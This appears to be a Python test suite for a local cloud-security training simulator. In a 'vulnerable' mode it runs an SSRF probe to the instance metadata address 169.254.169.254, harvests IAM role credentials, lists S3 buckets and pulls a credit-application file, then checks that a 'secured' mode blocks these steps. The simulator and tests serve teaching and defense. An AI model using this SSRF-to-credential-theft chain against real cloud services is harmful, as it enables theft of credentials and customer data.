#!/usr/bin/env python3
"""
Automated Test Suite for CloudGuard
Validates all attack vectors, defenses, endpoints, and CLI simulations.
"""

import urllib.request
import urllib.parse
import urllib.error
import json
import sys

BASE = 'http://localhost:5000'

def test(name, ok, detail=''):
    mark = '[PASS]' if ok else '[FAIL]'
    print(f"{mark} {name}: {detail}")
    if not ok:
        raise AssertionError(f"Test failed: {name}")

def run_all_tests():
    print("=" * 65)
    print("  RUNNING CLOUDGUARD AUTOMATED VERIFICATION SUITE")
    print("=" * 65)

    # 1. Static Files Serving
    for path in ['/', '/css/style.css', '/js/app.js', '/js/topology.js', '/js/terminal.js']:
        res = urllib.request.urlopen(BASE + path)
        content = res.read()
        test(f"Static File {path}", res.getcode() == 200 and len(content) > 0, f"HTTP {res.getcode()}, {len(content)} bytes")

    # 2. Reset scenario to Vulnerable
    req = urllib.request.Request(
        f"{BASE}/api/config/scenario",
        data=json.dumps({"scenario": "vulnerable"}).encode("utf-8"),
        headers={"Content-Type": "application/json"}
    )
    res = urllib.request.urlopen(req)
    test("Scenario Reset to Vulnerable", res.getcode() == 200, "HTTP 200")

    # 3. Status Check
    res = urllib.request.urlopen(f"{BASE}/api/status")
    status = json.loads(res.read().decode("utf-8"))
    test("Status Verification", status["scenario"] == "vulnerable" and status["threat_level"] == "CRITICAL", f"Scenario: {status['scenario']}, Threat: {status['threat_level']}")

    # 4. Vulnerable Step 1: SSRF Probe to 169.254.169.254
    target_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    res = urllib.request.urlopen(f"{BASE}/api/waf/proxy?url={urllib.parse.quote(target_url)}")
    d1 = json.loads(res.read().decode("utf-8"))
    test("Vulnerable Step 1 (SSRF)", d1.get("success") is True and "app-waf-production-role" in str(d1.get("imds_response")), f"Discovered Role: {d1.get('imds_response')}")

    # 5. Vulnerable Step 2: Harvest STS Credentials via IMDS
    target_url2 = "http://169.254.169.254/latest/meta-data/iam/security-credentials/app-waf-production-role"
    res2 = urllib.request.urlopen(f"{BASE}/api/waf/proxy?url={urllib.parse.quote(target_url2)}")
    d2 = json.loads(res2.read().decode("utf-8"))
    stolen_creds = d2.get("imds_response")
    test("Vulnerable Step 2 (Harvest STS)", stolen_creds and "AccessKeyId" in stolen_creds, f"AccessKeyId: {stolen_creds.get('AccessKeyId')}")

    # 6. Vulnerable Step 3: S3 Reconnaissance (ListBuckets)
    req3 = urllib.request.Request(
        f"{BASE}/api/aws/s3",
        data=json.dumps({"action": "ListBuckets", "auth": stolen_creds}).encode("utf-8"),
        headers={"Content-Type": "application/json"}
    )
    res3 = urllib.request.urlopen(req3)
    d3 = json.loads(res3.read().decode("utf-8"))
    test("Vulnerable Step 3 (S3 ListBuckets)", d3.get("success") is True and len(d3.get("buckets", [])) >= 4, f"Buckets enumerated: {len(d3.get('buckets', []))}")

    # 7. Vulnerable Step 4: S3 Exfiltration (GetObject)
    req4 = urllib.request.Request(
        f"{BASE}/api/aws/s3",
        data=json.dumps({
            "action": "GetObject",
            "bucket": "c1-prod-credit-applications",
            "key": "customer_credit_applications_2019.json",
            "auth": stolen_creds
        }).encode("utf-8"),
        headers={"Content-Type": "application/json"}
    )
    res4 = urllib.request.urlopen(req4)
    d4 = json.loads(res4.read().decode("utf-8"))
    test("Vulnerable Step 4 (Exfiltrate Records)", d4.get("success") is True and len(d4.get("data", [])) > 0, f"Exfiltrated {d4.get('records_count')} records")

    # 8. Switch to Secured Scenario
    req_sec = urllib.request.Request(
        f"{BASE}/api/config/scenario",
        data=json.dumps({"scenario": "secured"}).encode("utf-8"),
        headers={"Content-Type": "application/json"}
    )
    res_sec = urllib.request.urlopen(req_sec)
    test("Switch to Secured Configuration", res_sec.getcode() == 200, "HTTP 200")

    # 9. Secured Step 1: SSRF Egress Filter blocks link-local
    try:
        urllib.request.urlopen(f"{BASE}/api/waf/proxy?url={urllib.parse.quote(target_url)}")
        test("Secured Step 1 (Should Block)", False, "Did not raise 403")
    except urllib.error.HTTPError as e:
        body = json.loads(e.read().decode("utf-8"))
        test("Secured Step 1 (SSRF Blocked)", e.code == 403 and "CloudGuard SSRF Defense Filter" in body.get("blocked_by", ""), f"HTTP {e.code} - {body.get('reason')}")

    # 10. Secured Step 3: IAM Least Privilege blocks S3 ListBuckets
    try:
        urllib.request.urlopen(req3)
        test("Secured Step 3 (Should Block)", False, "Did not raise 403")
    except urllib.error.HTTPError as e:
        body = json.loads(e.read().decode("utf-8"))
        test("Secured Step 3 (IAM Blocked)", e.code == 403 and body.get("error_code") == "AccessDenied", f"HTTP {e.code} - {body.get('error_message')[:75]}...")

    # 11. Interactive Terminal Commands
    for cmd in ["aws sts get-caller-identity", "status", "aws s3 ls"]:
        req_cmd = urllib.request.Request(
            f"{BASE}/api/terminal/execute",
            data=json.dumps({"command": cmd}).encode("utf-8"),
            headers={"Content-Type": "application/json"}
        )
        res_cmd = urllib.request.urlopen(req_cmd)
        d_cmd = json.loads(res_cmd.read().decode("utf-8"))
        test(f"Terminal Command '{cmd}'", len(d_cmd.get("output", "")) > 0, d_cmd.get("output").splitlines()[0] if d_cmd.get("output") else "")

    # 12. CloudTrail Audit Logs
    res_logs = urllib.request.urlopen(f"{BASE}/api/logs")
    d_logs = json.loads(res_logs.read().decode("utf-8"))
    test("CloudTrail Event Logging", len(d_logs.get("logs", [])) >= 5, f"{len(d_logs.get('logs', []))} audit events logged")

    print("=" * 65)
    print("  ALL 12 AUTOMATED TESTS PASSED SUCCESSFULLY!")
    print("=" * 65)

if __name__ == '__main__':
    run_all_tests()
